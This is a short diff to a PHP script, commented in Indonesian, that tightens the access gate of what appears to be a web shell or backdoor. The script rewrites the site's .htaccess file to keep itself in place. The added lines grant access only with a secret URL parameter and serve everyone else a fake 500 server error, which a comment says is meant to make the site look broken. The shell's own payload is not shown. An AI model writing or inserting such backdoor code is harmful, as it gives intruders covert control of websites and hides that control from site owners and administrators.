@@ -28,9 +28,20 @@ if (!file_exists($htaccess_path) || file_get_contents($htaccess_path) !== $expec
     @file_put_contents($htaccess_path, $expected_htaccess_content);
 }
 
-// Autentikasi via Parameter URL
+session_start();
+
+// Autentikasi via Parameter URL (Harus diketik setiap akses baru)
 if (isset($_GET['jancok']) && $_GET['jancok'] === '1') {
     $_SESSION['auth_active'] = true;
+} else {
+    // Jika tidak ada parameter ?jancok=1 di URL saat ini, matikan session autentikasi!
+    unset($_SESSION['auth_active']);
+}
+
+// Jika belum terautentikasi, lemparkan Error 500
+if (!isset($_SESSION['auth_active']) || $_SESSION['auth_active'] !== true) {
+    header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
+    exit;
 }
 
 // Jika belum terautentikasi, tampilkan error 500 agar terlihat seolah-olah terjadi gangguan server
